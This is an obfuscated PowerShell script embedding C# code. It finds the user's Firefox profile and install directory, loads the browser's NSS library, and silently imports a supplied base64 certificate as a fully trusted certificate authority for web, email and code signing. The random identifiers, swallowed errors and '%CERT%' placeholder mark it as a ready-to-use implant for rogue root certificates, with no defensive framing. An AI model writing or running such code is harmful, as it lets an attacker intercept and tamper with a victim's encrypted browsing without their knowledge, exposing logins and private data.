function tcXQywqUSqjH{
Add-Type @"
using System;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.ComponentModel;

public sealed class bmioSaauKx
{
	private static volatile bmioSaauKx CSabcn;
	private static object EaqLHdMhdBZETrI = new Object();
	public static bmioSaauKx dgahhQoyteFKij()
    {
        if (CSabcn == null)
        {
            lock (EaqLHdMhdBZETrI)
            {
                if (CSabcn == null)
                CSabcn = new bmioSaauKx();
            }
        }
        return CSabcn;
    }
	
	const int MSQEcNzGwNd=0;
    
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    private static IntPtr fZi(string libPath)
    {
        if (String.IsNullOrEmpty(libPath))
            throw new ArgumentNullException("libPath");

        IntPtr moduleHandle = LoadLibrary(libPath);
        if (moduleHandle == IntPtr.Zero)
        {
            int lasterror = Marshal.GetLastWin32Error();
            System.Console.WriteLine(String.Format("Last error: 0x{0:X}",lasterror));
            Win32Exception innerEx = new Win32Exception(lasterror);
            innerEx.Data.Add("LastWin32Error", lasterror);
            throw new Exception("can't load DLL " + libPath, innerEx);
        }
        return moduleHandle;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
	//Constants
    const uint NSS_INIT_READONLY=0x1;
    const uint NSS_INIT_NOCERTDB = 0x2;
    const uint NSS_INIT_NOMODDB = 0x4;
    const uint NSS_INIT_FORCEOPEN = 0x8;
    const uint NSS_INIT_NOROOTINIT = 0x10;
    const uint NSS_INIT_OPTIMIZESPACE = 0x20;
    const uint NSS_INIT_PK11THREADSAFE = 0x40;
    const uint NSS_INIT_PK11RELOAD = 0x80;
    const uint NSS_INIT_NOPK11FINALIZE = 0x100;
    const uint NSS_INIT_RESERVED = 0x200;
    const uint NSS_INIT_COOPERATE = NSS_INIT_PK11THREADSAFE | NSS_INIT_PK11RELOAD | NSS_INIT_NOPK11FINALIZE | NSS_INIT_RESERVED;

    const string SECMOD_DB = "secmod.db";
    //Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct SECItem 
    {
        public uint iType;
        public IntPtr bData;
        public uint iDataLen;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CertTrusts
    {
        public int iSite;
        public int iEmail;
        public int iSoft;
    }

    private enum SECCertUsage
    {
        certUsageSSLClient = 0,
        certUsageSSLServer = 1,
        certUsageSSLServerWithStepUp = 2,
        certUsageSSLCA = 3,
        certUsageEmailSigner = 4,
        certUsageEmailRecipient = 5,
        certUsageObjectSigner = 6,
        certUsageUserCertImport = 7,
        certUsageVerifyCA = 8,
        certUsageProtectedObjectSigner = 9,
        certUsageStatusResponder = 10,
        certUsageAnyCA = 11
    }
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int pnkbfXcFoGnFy(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);

    private int DrSnqA(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Initialize");
        pnkbfXcFoGnFy ptr = (pnkbfXcFoGnFy)Marshal.GetDelegateForFunctionPointer(pProc, typeof(pnkbfXcFoGnFy));
        return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr DSWru();
    private IntPtr VmNaPqe()
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_GetDefaultCertDB");
        DSWru ptr = (DSWru)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DSWru));
        return ptr();
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr SQTDZwqDltww();
    private IntPtr AuhROAD()
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Shutdown");
        SQTDZwqDltww ptr = (SQTDZwqDltww)Marshal.GetDelegateForFunctionPointer(pProc, typeof(SQTDZwqDltww));
        return ptr();
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int jgztPQYUcCqti(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
    private int lNAhXCqNAOzryU(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ImportCerts");
        jgztPQYUcCqti ptr = (jgztPQYUcCqti)Marshal.GetDelegateForFunctionPointer(pProc, typeof(jgztPQYUcCqti));
        return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
    }

    private delegate int QoQlhxcZtWbU(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
    private int enTg(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ChangeCertTrust");
        QoQlhxcZtWbU ptr = (QoQlhxcZtWbU)Marshal.GetDelegateForFunctionPointer(pProc, typeof(QoQlhxcZtWbU));
        return ptr(certdb, cert, ref trust);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int MNnHOkgvTXcfx(IntPtr cert, uint ncerts);
    private int xBTjtYhnvW(IntPtr cert, uint ncerts)
    {
        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_DestroyCertArray");
        MNnHOkgvTXcfx ptr = (MNnHOkgvTXcfx)Marshal.GetDelegateForFunctionPointer(pProc, typeof(MNnHOkgvTXcfx));
        return ptr(cert, ncerts);
    }

	private IntPtr uKfqQI = IntPtr.Zero;
	
	public Boolean SwQ(String sCert){
        System.Console.WriteLine("bmioSaauKx Start");
		String sProfile = GetProfile();
        if (String.IsNullOrEmpty(sProfile))
        {
            System.Console.WriteLine("Profile not found");
            return false;
        }
        System.Console.WriteLine("Profile path="+sProfile);
        byte[] bCert = GetCertAsByteArray(sCert);
		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
		try
        {
            DirectoryInfo diInstallPath = GetIP();
            String sCurrentDirectory = Directory.GetCurrentDirectory();
            Directory.SetCurrentDirectory(diInstallPath.FullName);
            System.Console.WriteLine("Install path="+diInstallPath.FullName);
            foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
            {
                if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
                fZi(fiDll.FullName);
            }
            uKfqQI = fZi(diInstallPath.FullName + "\\nss3.dll");
            if (uKfqQI.Equals(IntPtr.Zero))
            {
                System.Console.WriteLine("Firefox install directory not found");
                return false;
            }
            Directory.SetCurrentDirectory(sCurrentDirectory);
            //Init cert
            Marshal.Copy(bCert, 0, ipCert, bCert.Length);
            SECItem CertItem = new SECItem();
            CertItem.iType = 3;
            CertItem.bData = ipCert;
            CertItem.iDataLen = (uint)bCert.Length;
            SECItem[] aCertItem = new SECItem[1];
            aCertItem[0] = CertItem;

            CertTrusts CertTrust = new CertTrusts();
            CertTrust.iSite = 0x10;
            CertTrust.iEmail = 0x10;
            CertTrust.iSoft = 0x10;
            System.Console.WriteLine("Init cert OK");
            //End init cert
            int status = DrSnqA(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
            if (status != MSQEcNzGwNd)
            {
                System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                return false;
            }
            IntPtr bd = VmNaPqe();
            if (bd == IntPtr.Zero)
            {
                System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
                AuhROAD();
                return false;
            }
            System.Console.WriteLine("CERT_GetDefaultCertDB OK");
            IntPtr CertToImport = new IntPtr();
            IntPtr[] aCertToImport = new IntPtr[1];
            status = lNAhXCqNAOzryU(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
            if (status != MSQEcNzGwNd)
            {
                System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                AuhROAD();
                return false;
            }
            System.Console.WriteLine("CERT_ImportCerts OK");
            Marshal.Copy(CertToImport, aCertToImport, 0, 1);
            status = enTg(bd, aCertToImport[0], ref CertTrust);
            if ( status != MSQEcNzGwNd) 
            {
                System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                AuhROAD();
                return false;
            };
            System.Console.WriteLine("CERT_ChangeCertTrust OK");
            xBTjtYhnvW(CertToImport, 1);
            System.Console.WriteLine("Add cert OK");
        }
        catch (Exception){}
        finally
        {
            AuhROAD();
        }
		return true;
	}
	private String GetProfile()
    {
        String FFProfile = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), @"Mozilla\Firefox\Profiles");
        if (Directory.Exists(FFProfile))
        {
            if (Directory.GetDirectories(FFProfile, "*.default").Length > 0)
            {
                return Directory.GetDirectories(FFProfile, "*.default")[0];
            }
        }
        return "";
    }
	public byte[] GetCertAsByteArray(String sCert)
    {
        try
        {
            return Convert.FromBase64String(sCert);
        }
        catch (Exception){}
        return null;
    }
	private DirectoryInfo GetIP()
    {
        DirectoryInfo fp = null;
        // get firefox path from registry
        // we'll search the 32bit install location
        RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
        // and lets try the 64bit install location just in case
        RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);

        if (localMachine1 != null)
        {
            try
            {
                string[] installedVersions = localMachine1.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");

                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        else if (localMachine2 != null)
        {
            try
            {
                string[] installedVersions = localMachine2.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");
                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        return fp;
    }
}
"@;
[bmioSaauKx]::dgahhQoyteFKij().SwQ("%CERT%");
}
tcXQywqUSqjH
